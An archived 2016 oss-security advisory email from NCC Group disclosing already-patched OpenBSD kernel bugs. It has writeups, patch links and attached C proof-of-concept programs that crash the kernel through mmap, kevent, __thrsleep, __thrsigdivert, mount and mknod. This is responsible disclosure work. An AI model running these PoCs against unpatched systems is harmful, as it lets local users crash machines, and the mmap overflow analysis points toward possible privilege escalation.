X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["34367" "Thursday" "14" "July" "2016" "21:09:34" "+0000" "Jesse Hertz" "Jesse.Hertz@nccgroup.trust" "<35D91F81-1E00-4305-8DED-848D88C8CD58@nccgroup.trust>" "965" "[oss-security] Multiple Bugs in OpenBSD Kernel " "^CC:" nil nil "7" "2016071421:09:34" "[oss-security] Multiple Bugs in OpenBSD Kernel" (number mark "        Jesse.Hertz@ Jul 14  965/34367 " thread-indent "\"[oss-security] Multiple Bugs in OpenBSD Kernel \"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 5372 invoked by uid 550); 14 Jul 2016 21:10:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 5318 invoked from network); 14 Jul 2016 21:09:57 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=nccgroup.trust; s=dkim20160329; t=1468530585; bh=FR+dYTx+D86tRhq1CGNkeXaFlaB2TAUd7oGgmnl7r88=; h=From:To:CC:Subject:Date:Message-ID:Content-Type:MIME-Version; b=DeMCoLl5KYpfeqsm5dHkQG7ki13KhpGYmgcF6DwKYV0KkwoPtElqOyxdoTuLP51MTqzA0I98qOUCD0hx5BmP3X9T8fYoif9mMmX98Q0HK1I/pCYc7IAZOUm+sK4uXm93FpvAclOr+SbjFX5ha5WpK6Ci+9uYmOR58nrBCRrlaWo=
X-MC-Unique: Pe7dVZL4OAOQCK1HMB0A4g-3
X-PGP-Universal: processed;
	by man1srvpgp01p.nccgroup.local on Thu, 14 Jul 2016 22:09:37 +0100
Thread-Topic: Multiple Bugs in OpenBSD Kernel 
Thread-Index: AQHR3hQFeFIa1gxMaEOUn27CATzinA==
Message-ID: <35D91F81-1E00-4305-8DED-848D88C8CD58@nccgroup.trust>
Accept-Language: en-GB, en-US
Content-Language: en-US
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator:
x-ms-exchange-messagesentrepresentingtype: 1
x-ms-exchange-transport-fromentityheader: Hosted
x-originating-ip: [172.20.1.120]
signature: OK
Content-Type: multipart/signed;
	boundary="Apple-Mail=_687C18D9-DCED-4674-94AF-2C504B829F41";
	protocol="application/pgp-signature"; micalg=pgp-sha512
MIME-Version: 1.0
CC: #NA-Disclosure <na-disclosure@nccgroup.trust>
Date: Thu, 14 Jul 2016 21:09:34 +0000
From: Jesse Hertz <Jesse.Hertz@nccgroup.trust>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Multiple Bugs in OpenBSD Kernel 
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>

--Apple-Mail=_687C18D9-DCED-4674-94AF-2C504B829F41
Content-Type: multipart/alternative;
	boundary="Apple-Mail=_6CCE7EE4-D7D5-46E3-88CA-E6F041B6B171"


--Apple-Mail=_6CCE7EE4-D7D5-46E3-88CA-E6F041B6B171
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;
	charset=utf-8

Hi All,

As part of NCC Group=E2=80=99s Project Triforce, a generic syscall fuzzing =
effort by
myself and Tim Newsham, several new vulnerabilities were discovered in the
OpenBSD kernel. These have all been fixed now.

Attached are source files for each issue that include a full writeup of the
issue, links to the patches, as well as a PoC to demonstrate the issue. We =
are
requesting CVEs for all but the last issue (which is root-only). The follow=
ing list contains brief
description of each issue, ordered from highest to lowest severity.

mmap_panic: Malicious calls to mmap() can trigger an allocation panic or tr=
igger memory corruption.
kevent_panic: Any user can panic the kernel with the kevent system call.
thrsleep_panic: Any user can panic the kernel with the __thrsleep system ca=
ll.
thrsigdivert_panic: Any user can panic the kernel with the __thrsigdivert s=
ystem call.
ufs_getdents_panic: Any user can panic the kernel with the getdents system =
call.
mount_panic: Root users, or users on systems with kern.usermount set to tru=
e, can trigger a kernel panic when mounting a tmpfs filesystem.
unmount_panic: Root users, or users on systems with kern.usermount set to t=
rue, can trigger a kernel panic when unmounting a filesystem.
tmpfs_mknod_panic: Root can panic kernel with mknod on a tmpfs filesystem.

Errata have been issued which cover some of these issues on http://www.open=
bsd.org/errata59.html <http://www.openbsd.org/errata59.html> and http://www=
.openbsd.org/errata58.html <http://www.openbsd.org/errata58.html>.

NCC Group would like to thank the OpenBSD development team for clear
communication and a quick turnaround on these issues.

Best,
-jh



--Apple-Mail=_6CCE7EE4-D7D5-46E3-88CA-E6F041B6B171
Content-Type: multipart/mixed;
	boundary="Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE"


--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html;
	charset=utf-8

<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html charset=
=3Dutf-8"></head><body style=3D"word-wrap: break-word; -webkit-nbsp-mode: s=
pace; -webkit-line-break: after-white-space;" class=3D"">Hi All,<div class=
=3D""><br class=3D""></div><div class=3D"">As part of NCC Group=E2=80=99s P=
roject Triforce, a generic syscall fuzzing effort by<br class=3D"">myself a=
nd Tim Newsham, several new vulnerabilities were discovered in the<br class=
=3D"">OpenBSD kernel. These have all been fixed now.&nbsp;<br class=3D""><b=
r class=3D""></div><div class=3D"">Attached are source files for each issue=
 that include a full writeup of the<br class=3D"">issue, links to the patch=
es, as well as a PoC to demonstrate the issue. We are<br class=3D"">request=
ing CVEs for all but the last issue (which is root-only). The following lis=
t contains brief<br class=3D"">description of each issue, ordered from high=
est to lowest severity.<br class=3D""></div><div class=3D""><br class=3D"">=
</div><div class=3D""><div class=3D"">mmap_panic: Malicious calls to mmap()=
 can trigger an allocation panic or trigger memory corruption.<br class=3D"=
">kevent_panic: Any user can panic the kernel with the kevent system call.<=
br class=3D"">thrsleep_panic: Any user can panic the kernel with the __thrs=
leep system call.<br class=3D"">thrsigdivert_panic: Any user can panic the =
kernel with the __thrsigdivert system call.<br class=3D"">ufs_getdents_pani=
c: Any user can panic the kernel with the getdents system call.<br class=3D=
"">mount_panic: Root users, or users on systems with kern.usermount set to =
true, can trigger a kernel panic when mounting a tmpfs filesystem.<br class=
=3D"">unmount_panic: Root users, or users on systems with kern.usermount se=
t to true, can trigger a kernel panic when unmounting a filesystem.<br clas=
s=3D"">tmpfs_mknod_panic: Root can panic kernel with mknod on a tmpfs files=
ystem.</div></div><div class=3D""><br class=3D""></div><div class=3D"">Erra=
ta have been issued which cover some of these issues on&nbsp;<a href=3D"htt=
p://www.openbsd.org/errata59.html" class=3D"">http://www.openbsd.org/errata=
59.html</a>&nbsp;and&nbsp;<a href=3D"http://www.openbsd.org/errata58.html" =
class=3D"">http://www.openbsd.org/errata58.html</a>.</div><div class=3D""><=
br class=3D""></div><div class=3D"">NCC Group would like to thank the OpenB=
SD development team for clear<br class=3D"">communication and a quick turna=
round on these issues.&nbsp;</div><div class=3D""><br class=3D""></div><div=
 class=3D"">Best,</div><div class=3D"">-jh</div><div class=3D""></div></bod=
y></html>=

--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Disposition: attachment;
	filename=kevent_panic.c
Content-Type: application/octet-stream;
	name="kevent_panic.c"
Content-Transfer-Encoding: 7bit

/*
 * kevent_panic.c
 *    Demonstrate a panic through the kevent system call.
 *
 * gcc -g kevent_panic.c -o kevent_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
kevent with large ident can lead to a panic

Impact:
Any logged in user can use kevent to panic the kernel.

Description:
When processing a kevent system call, kqueue_register() is called
for each of the changes in the user-provided change list.  When 
processing changes with a filter of EVFILT_READ, kqueue_register()
creates a new knote, attaches the user-provided kevent (the change)
to it, and calls knote_attach().  This function resizes an internal
fdp->fd_knlist based on the value stored in kn->kn_id (which is
really kn->kn_kevent->ident).  This field is from the user-provided
kn->kn_kevent value and can be arbitrary.  The relevant code is:

    if (fdp->fd_knlistsize <= kn->kn_id) {
        size = fdp->fd_knlistsize;
        while (size <= kn->kn_id)
            size += KQEXTENT;
        list = mallocarray(size, sizeof(struct klist), M_TEMP,
            M_WAITOK);

If the original ident value is overly large, the value of "size" will
be correspondingly large, and can trigger an assertion in mallocarray().
This can be abused by any user to cause a kernel panic.

Reproduction:
Run the attached kevent_panic.c program.  It will cause a panic such as
"panic: mallocarray: overflow 18446744071562067968 * 8".  (Here the
value 18446744071562067968 is ffff.ffff.8000.0000 and was caused
by sign-extension of the "int size" variable when passing it in to
the "size_t nmemb" argument of mallocarra()).  NCC Group was 
able to reproduce this issue on OpenBSD 5.9 release running amd64.

Recommendation:
Validate the ident field of items in the change list. Return
an error when adding a change with an overly large ident field.
This can be done in knote_attach() or earlier in kqueue_register()
or sys_kevent().

Reported: 2016-07-13
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_event.c.diff?r1=1.72&r2=1.73
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/019_kevent.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/022_kevent.patch.sig

#endif // BUG_WRITEUP ---------------------------------------------------


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/event.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

int main(int argc, char **argv)
{
    struct kevent chlist[1];
    int x, kq;

    kq = kqueue();
    xperror(kq == -1, "kqueue");

    memset(chlist, 0, 1 * sizeof chlist[0]);
    chlist[0].ident = 0x20000000000000;
    chlist[0].filter = EVFILT_READ;
    chlist[0].flags = EV_ADD;
    x = kevent(kq, chlist, 1, 0, 0, 0);
    xperror(x == -1, "kevent");
    printf("no crash!\n");
    return 0;
}

--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Transfer-Encoding: 7bit
Content-Type: text/html;
	charset=us-ascii

<html><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;"><head><meta http-equiv="Content-Type" content="text/html charset=us-ascii"></head><div></div></body></html>
--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Disposition: attachment;
	filename=mmap_panic.c
Content-Type: application/octet-stream;
	name="mmap_panic.c"
Content-Transfer-Encoding: 7bit

/*
 * mmap_panic.c
 *    Demonstrate a panic through the mmap system call.
 *
 * gcc -g mmap_panic.c -o mmap_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
MMap can trigger an allocation panic or trigger memory corruption

Impact:
Any user on the system can use the mmap call to trigger a kernel
panic due to an over-large kernel allocation.  Users can also
trigger integer overflows which lead to undersized allocation
which later lead to kernel memory corruption. This may allow
an attacker to gain code execution in the kernel and result
in privilege escalation.

Description:
When a user provides the __MAP_NOFAULT flag to mmap, the
kernel calls amap_alloc() which calls malloc() with a size derived 
from the user-passed size. This is called through
sys_mmap(), uvm_mmapfile() and uvm_map() without ever
validating the user-provided size. This can result in a panic
in malloc.  For example when requesting a mapping of
0x222.1111.0000 bytes, amap_alloc() will compute that it needs
0x2221.1110 slots and amap_alloc1() will compute that it needs
0x2221.1200 total slots and will call malloc() to allocate
0x2.2211.2000 bytes resulting in a panic of
"panic: malloc: allocation too large, type = 98, size = 9161482240".

The amap_alloc() call is reachable whenever the UVM_FLAG_OVERLAY
flag has been selected.  This happens when mapping a file
with the __MAP_NOFAULT or when making a MAP_ANON maping.
However, the MAP_ANON cause performs validation on the size
parameter which prevents large alocations from happening in
amap_alloc().

Besides causing a panic, the amap_alloc() code can also miscalculate 
the allocation size which would cause an undersized allocation in 
amap_alloc1().  This could lead to memory corruption later.  There are 
two causes.  First amap_alloc() computes slots from a size_t size into
an integer slots variable:

struct vm_amap *
amap_alloc(vaddr_t sz, vaddr_t padsz, int waitf)
{
    struct vm_amap *amap;
    int slots, padslots;

    AMAP_B2SLOT(slots, sz);     /* load slots */
    AMAP_B2SLOT(padslots, padsz);

(Note that padslots is always zero when called from the mmap system call).
If the original size is larger 0x1000.0000.0000 or larger it will
result in a truncated value of slots, resulting in an undersized amap.
The second problem arises in amap_alloc1():

    totalslots = malloc_roundup((slots + padslots) * MALLOC_SLOT_UNIT) /
        MALLOC_SLOT_UNIT;
    amap->am_ref = 1;
    amap->am_flags = 0;
#ifdef UVM_AMAP_PPREF
    amap->am_ppref = NULL;
#endif
    amap->am_maxslot = totalslots;
    amap->am_nslot = slots;
    amap->am_nused = 0;

    amap->am_slots = malloc(totalslots * MALLOC_SLOT_UNIT, M_UVMAMAP,
        waitf);

The number of slots is rounded up so that the slot entries fill
full pages.  This rounding up happens in the integer "totalslots"
variable, and can overflow the original "slots" value.  This
can happen when requesting an allocation of size 0xfff.ffff.0000,
for example. In this case amap_alloc() computes that
0xffff.fff0 slots are needed and amap_alloc1() computes
that zero totalslots are needed, and allocates an amap of zero
bytes.  If the amap->am_slots, amap->am_bckptr or amap->am_anon
fields are later accessed, it can lead to out-of-memory
reads and writes on the kernel allocation heap.  Many accesses
through these pointers are guaraded by am_slots (the original
slots count of 0xfffffff0) and not am_maxslots (which contains the 
flawed slot count of zero). This might lead to kernel code execution 
and privilege escalation.

Reproduction:
Run the attached mmap_panic.c program. It performs a mmap
call with a large size and with the __MAP_NOFAULT flag set.
This results in a panic of 
"malloc: allocation too large, type = 98, size = 9161482240".  
(Note that 9161482240 is 0x2.2211.2000 in hex).
NCC Group was able to reproduce this issue on OpenBSD 5.9 release 
running amd64.

Run the attached mmap_panic.c program as "./mmap-panic -1"
to trigger the second test case.  This case causes a zero-byte
allocation of the amap.  It does not cause a crash, but setting
a breakpoint in amap_alloc1() will verify the short allocation.

Recommendation:
Address the allocation size issue by validating the allocation
size in sys_mmap.c in uvm/uvm_mmap.c.  Code for validating
sizes already exists for other cases, such as when creating
an anonymous mapping:

        if ((flags & MAP_ANON) != 0 ||
            ((flags & MAP_PRIVATE) != 0 && (prot & PROT_WRITE) != 0)) {
            if (size >
                (p->p_rlimit[RLIMIT_DATA].rlim_cur - ptoa(p->p_vmspace->vm_dused))) {
                return ENOMEM;
            }
        }

To address the integer truncation and overflow issues, change
the "slots" and "padslots" variables in amap_alloc() to unsigned
long values or some other suitable type.  Change the "totalslots"
type in amap_alloc1() to the same type, and detect integer
overflows when using malloc_roundup().  The resulting count
should always be larger than the original slots argument and
an error should be returned when it is not.

Reported: 2016-07-12
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_mmap.c.diff?r1=1.134&r2=1.135
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_mmap.c.diff?r1=1.135&r2=1.136
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_mmap.c.diff?r1=1.136&r2=1.137
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/uvm/uvm_amap.c.diff?r1=1.74&r2=1.75
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/016_mmap.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/016_mmap.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/020_mmap.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/020_mmap.patch.sig

#endif // BUG_WRITEUP ---------------------------------------------------


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

void test0()
{
    void *p;
    int fd;

    fd = open("/tmp/mapfile", O_RDWR | O_CREAT, 0666);
    xperror(fd == -1, "/tmp/mapfile");

    /* cause a crash in kernel malloc */
    printf("test0\n");
    p = mmap(0, 0x222211110000, 0, __MAP_NOFAULT, fd, 0);
    xperror(p == (void*)-1, "mmap");
}

void test1()
{
    char *p;
    size_t i;
    int fd;

    fd = open("/tmp/mapfile", O_RDWR | O_CREAT, 0666);
    xperror(fd == -1, "/tmp/mapfile");

    /* cause a bad amap allocation */
    printf("test1\n");
    p = mmap(0, 0x0fffffff0000, 0, __MAP_NOFAULT, fd, 0);
    xperror((void*)p == (void*)-1, "mmap");

    /* note: no crash is caused, the bad amap is never used... */
}

int main(int argc, char **argv)
{
    if(argc > 1 && strcmp(argv[1], "-1") == 0) 
        test1();
    else
        test0();
    printf("no crash!\n");
    return 0;
}

--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Transfer-Encoding: 7bit
Content-Type: text/html;
	charset=us-ascii

<html><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;"><head><meta http-equiv="Content-Type" content="text/html charset=us-ascii"></head><div></div></body></html>
--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Disposition: attachment;
	filename=mount_panic.c
Content-Type: application/octet-stream;
	name="mount_panic.c"
Content-Transfer-Encoding: 7bit

/*
 * mount_panic.c
 *    Demonstrate a panic through the mount system call.
 *
 * gcc -g mount_panic.c -o mount_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Tmpfs mount with bad args can lead to a panic

Impact:
Root users or users on systems with kern.usermount set to true can
trigger a kernel panic when mounting a tmpfs filesystem.

Description:
The tmpfs filesystem allows the mounting user to specify a
username, a groupname or a device name for the root node of
the filesystem.  A user that specifies a value of VNOVAL for
any of these fields will trigger an assert in tmpfs_alloc_node():

    /* XXX pedro: we should check for UID_MAX and GID_MAX instead. */
    KASSERT(uid != VNOVAL && gid != VNOVAL && mode != VNOVAL);

This condition can only be triggered by users who are allowed
to mount a tmpfs filesystem. Normally this is the root user, but
if the kern.usernmount sysctl variable has been set to true,
any user could trigger this panic.

Reproduction:
Run the attached mount_panic.c program.  It will mount a tmpfs
filesystem with invalid settings and will lead to a panic of
"panic: kernel diagnostic assertion "uid != VNOVAL && gid != VNOVAL 
&& mode != VNOVAL" failed".  NCC Group was able to reproduce this issue
on OpenBSD 5.9 release running amd64.

Recommendation:
Validate the args.ta_root_uid, args.ta_root_gid and args.ta_root_mode
fields in tmpfs_mount() before calling tmpfs_alloc_node().
Return an error to the user when an invalid argument is detected.

Reported: 2016-07-11
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/tmpfs/tmpfs_vfsops.c.diff?r1=1.8&r2=1.9

#endif // BUG_WRITEUP ---------------------------------------------------


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/mount.h>

#define VNOVAL (-1)

int main(int argc, char **argv)
{
    struct tmpfs_args args;
    int x;

    memset(&args, 0, sizeof args);
    args.ta_version = TMPFS_ARGS_VERSION;
    args.ta_root_uid = VNOVAL;
    args.ta_root_gid = VNOVAL;
    args.ta_root_mode = VNOVAL;
    x = mount("tmpfs", "/mnt", 0, &args);
    if(x == -1)
        perror("mount");
    printf("no crash!\n");
    return 0;
}

--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Transfer-Encoding: 7bit
Content-Type: text/html;
	charset=us-ascii

<html><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;"><head><meta http-equiv="Content-Type" content="text/html charset=us-ascii"></head><div></div></body></html>
--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Disposition: attachment;
	filename=thrsigdivert_panic.c
Content-Type: application/octet-stream;
	name="thrsigdivert_panic.c"
Content-Transfer-Encoding: 7bit

/*
 * thrsigdivert_panic.c
 *    Demonstrate a panic through the __thrsigdivert system call.
 *
 * gcc -g thrsigdivert_panic.c -o thrsigdivert_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
__thrsigdivert validation is insufficient and can lead to a panic.

Impact: 
Any user can panic the OpenBSD kernel with the __thrsigdivert system call.

Description:
The __thrsigdivert system call allows a user to sleep for some amount
of time waiting for a signal.  The system call validates the user-provided 
parameters in sys___thrsigdivert() (kern/kern_sig.c) before calling to 
lower layers to implement the sleep:

        if (ts.tv_nsec < 0 || ts.tv_nsec >= 1000000000)
            timeinvalid = 1;
        else {
            to_ticks = (long long)hz * ts.tv_sec +
                ts.tv_nsec / (tick * 1000);
            if (to_ticks > INT_MAX)
                to_ticks = INT_MAX;
        }

This validation is insufficient.  Some values of the user-provided
ts can lead to a negative to_ticks value after conversion.  This 
condition triggers a panic in timeout_add (kern/kern_timeout.c) when 
the to_ticks value is checked to be positive:

        if (to_ticks < 0)
            panic("timeout_add: to_ticks (%d) < 0", to_ticks);

Reproduction:
Run the attached thrsigdivert_panic.c program.  NCC verified that
it causes a panic on OpenBSD 5.9 GENERIC kernel on an x86_64 processor.
NCC Group was able to reproduce this issue on OpenBSD 5.9 release 
running amd64.

Recommendation:
Return an error it ts.tv_sec is negative in sys___thrsigdivert.
Check to see if to_ticks is negative in sys___thrsigdivert 
(kern/kern_sig.c) and, if so, saturate its value at INT_MAX, since 
this indicates an overly large value.

Reported: 2016-07-05
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_sig.c.diff?r1=1.200&r2=1.201
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_synch.c.diff?r1=1.132&r2=1.133
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_tc.c.diff?r1=1.28&r2=1.29
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_timeout.c.diff?r1=1.47&r2=1.48
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/018_timeout.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/021_timeout.patch.sig

#endif // BUG_WRITEUP ---------------------------------------------------

#include <stdio.h>
#include <sys/signal.h>

int __thrsigdivert(sigset_t set, siginfo_t *info, const struct timespec *timeout);

int
main(int argc, char **argv)
{
    struct timespec tsp = { 0x687327fff5612f21, 0x63760a};
    siginfo_t info;

    __thrsigdivert(1, &info, &tsp);
    printf("nothing happened!\n");
    return 0;
}


--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Transfer-Encoding: 7bit
Content-Type: text/html;
	charset=us-ascii

<html><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;"><head><meta http-equiv="Content-Type" content="text/html charset=us-ascii"></head><div></div></body></html>
--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Disposition: attachment;
	filename=thrsleep_panic.c
Content-Type: application/octet-stream;
	name="thrsleep_panic.c"
Content-Transfer-Encoding: 7bit

/*
 * thrsleep_panic.c
 *    Demonstrate a panic through the __thrsleep system call.
 *
 * gcc -g thrsleep_panic.c -o thrsleep_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
__thrsleep validation is insufficient and can lead to a panic.

Impact: 
Any user can panic the OpenBSD kernel with the __thrsleep system call.

Description:
The __thrsleep system call allows a user to sleep for some amount
of time.  The system call validates the user-provided parameters
in thrsleep() (kern/kern_synch.c) before calling to lower layers
to implement the sleep:

        if (timespeccmp(tsp, &now, <)) {
            /* already passed: still do the unlock */
            if ((error = thrsleep_unlock(lock, lockflags)))
                return (error);
            return (EWOULDBLOCK);
        }

        timespecsub(tsp, &now, tsp);
        to_ticks = (long long)hz * tsp->tv_sec +
            (tsp->tv_nsec + tick * 1000 - 1) / (tick * 1000) + 1;
        if (to_ticks > INT_MAX)
            to_ticks = INT_MAX;

This validation is insufficient.  Some values of the user-provided
tsp can be in the future and still lead to a negative to_ticks value
after conversion.  This condition triggers a panic in timeout_add 
(kern/kern_timeout.c) when the to_ticks value is checked to be positive:

        if (to_ticks < 0)
            panic("timeout_add: to_ticks (%d) < 0", to_ticks);

Reproduction:
Run the attached thrsleep_panic.c program.  NCC verified that
it causes a panic on OpenBSD 5.9 GENERIC kernel on an x86_64 processor.

Recommendation:
Check to see if to_ticks is negative in thrsleep (kern/kern_synch.c) and, 
if so, saturate its value at INT_MAX, since this indicates an overly 
large value.

Reported: 2016-06-29
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_synch.c?rev=1.132&content-type=text/x-cvsweb-markup
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/018_timeout.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/021_timeout.patch.sig

#endif // BUG_WRITEUP ---------------------------------------------------

#include <stdio.h>
#include <sys/time.h>

int __thrsleep(const volatile void *id, clockid_t clock_id, const struct timespec *abstime, void *lock, const int *abort);

int
main(int argc, char **argv)
{
    struct timespec tsp = { 0x7000000000000000LL, 0 };
    int waitchan;

    __thrsleep(&waitchan, CLOCK_REALTIME, &tsp, NULL, NULL);
    printf("nothing happened!\n");
    return 0;
}


--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Transfer-Encoding: 7bit
Content-Type: text/html;
	charset=us-ascii

<html><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;"><head><meta http-equiv="Content-Type" content="text/html charset=us-ascii"></head><div></div></body></html>
--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Disposition: attachment;
	filename=tmpfs_mknod_panic.c
Content-Type: application/octet-stream;
	name="tmpfs_mknod_panic.c"
Content-Transfer-Encoding: 7bit

/*
 * tmpfs_mknod_panic.c:
 *    Demonstrate a panic in tmpfs when performing mknod
 *
 * gcc -g tmpfs_mknod_panic.c -o tmpfs_mknod_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Root can panic kernel with mknod on a tmpfs filesystem

Impact: 
Root can panic the kernel.

Description:
When performing a mknod system call on a tmpfs filesystem,
the tmpfs_alloc_node() function asserts that the rdev parameter
is not VNOVAL (-1):

    /* Type-specific initialization. */
    switch (nnode->tn_type) {
    case VBLK:
    case VCHR:
        /* Character/block special device. */
        KASSERT(rdev != VNOVAL);
        nnode->tn_spec.tn_dev.tn_rdev = rdev;
        break;

However, the value or rdev is never validated previous to this.
Users that can perform mknod() calls on a tmpfs (i.e. root)
can trigger this condition to panic the kernel.

Reproduction:
Compile the attached test program and execute it as root with a path
to a non-existance filename on a tmpfs filesystem:

  # mount -o rw,-s16M -t tmpfs swap /mnt
  # gcc -g tmpfs_mknod_panic.c -o tmpfs_mknod_panic
  # ./tmpfs_mknod_panic /mnt/boom

This should cause the kernel to panic in tmpfs_alloc_node().
NCC Group was able to reproduce this issue on OpenBSD 5.9 release 
running amd64.

Recommendation:
Validate the device number vap->va_rdev in tmpfs_mknod() and return
an error if it is VNOVAL (-1).

Reported: 2016-07-05
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/vfs_syscalls.c.diff?r1=1.260&r2=1.261
#endif // BUG_WRITEUP ---------------------------------------------------

#include <stdio.h>
#include <sys/stat.h>

int
main(int argc, char **argv)
{
    char *fn;
    int i, x;

    for(i = 1; i < argc; i++) {
        fn = argv[i];
        x = mknod(fn, S_IFBLK | 0666, -1);
        if(x == -1) 
            perror(fn);
    }
    printf("nothing happened!\n");
    return 0;
}


--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Transfer-Encoding: 7bit
Content-Type: text/html;
	charset=us-ascii

<html><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;"><head><meta http-equiv="Content-Type" content="text/html charset=us-ascii"></head><div></div></body></html>
--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Disposition: attachment;
	filename=ufs_getdents_panic.c
Content-Type: application/octet-stream;
	name="ufs_getdents_panic.c"
Content-Transfer-Encoding: 7bit

/*
 * ufs_getdents_panic.c
 *    Demonstrate a panic in UFS through the getdents system call.
 *
 * gcc -g ufs_getdents_panic.c -o ufs_getdents_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Any user can panic the kernel with the getdents call with a large buffer size

Impact:
Any user can panic the kernel if they can access any directories
of a UFS filesystem.

Description:
When processing the getdents system call, the UFS filesystem
allocates a buffer with a size provided by the caller.  This
size can be any value less than INT_MAX, and need not correspond
to an actual buffer held by the caller.  By providing an overly
large size, a caller can trigger a panic in the kernel
of "malloc: allocation too large" or "out of space in kmem_map".

This issue is triggered by an allocation in ufs_readdir():

    diskbuf = malloc(readcnt, M_TEMP, M_WAITOK);

here readcnt originates with the buffer length to the getdents
call, which was placed in the uio_resid field:

    count = uio->uio_resid;
    entries = (uio->uio_offset + count) & (DIRBLKSIZ - 1);

    /* Make sure we don't return partial entries. */
    if (count <= entries)
        return (EINVAL);

    /*
     * Convert and copy back the on-disk struct direct format to
     * the user-space struct dirent format, one entry at a time
     */

    /* read from disk, stopping on a block boundary, max 64kB */
    readcnt = max(count, 64*1024) - entries;

This condition can be triggered by any user who can read a
directory on a UFS filesystem.

Reproduction:
Run the attached ufs_getdents_panic.c program. It will pass call
getdents with a NULL buffer and a large size, that will trigger
a panic such as 'panic: malloc: allocation too large, type = 127, 
size = 1879048192'. NCC Group was able to reproduce this issue
on OpenBSD 5.9 release running amd64.

Recommendation:
Limit the readcnt in ufs_readdir() to an ammount that is
reasonable to allow an allocation for.

Reported: 2016-07-12
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/ufs/ufs/ufs_vnops.c.diff?r1=1.128&r2=1.129
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/015_dirent.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/019_dirent.patch.sig

